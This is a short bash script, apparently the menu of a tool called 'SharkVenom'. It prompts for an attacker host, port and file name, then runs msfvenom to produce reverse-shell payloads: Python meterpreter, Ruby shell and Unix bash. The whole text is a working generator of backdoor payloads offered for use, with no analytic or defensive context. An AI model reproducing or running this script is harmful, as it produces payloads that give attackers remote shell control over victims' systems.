read -p "Choose : " evil
if [ "$evil" -eq "01" ];then
read -p '[+] LHOST : ' lhost
read -p '[+] LPORT : ' lport
read -p '[+] NAME  : ' name
msfvenom --platform python python/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $name
fi
if [ "$evil" -eq "02" ];then
read -p '[+] LHOST : ' lhost
read -p '[+] LPORT : ' lport
read -p '[+] NAME  : ' name
msfvenom --platform ruby ruby/shell_reverse_tcp LHOST=$lhost LPORT=$lport -o $name
fi
if [ "$evil" -eq "03" ];then
read -p '[+] LHOST : ' lhost
read -p '[+] LPORT : ' lport
read -p '[+] NAME  : ' name
msfvenom --platform unix cmd/unix/reverse_bash LHOST=$lhost LPORT=$lport -o $name
fi
if [ "$evil" -eq "00" ];then
clear
cd
cd SharkVenom
sh shark.sh
fi



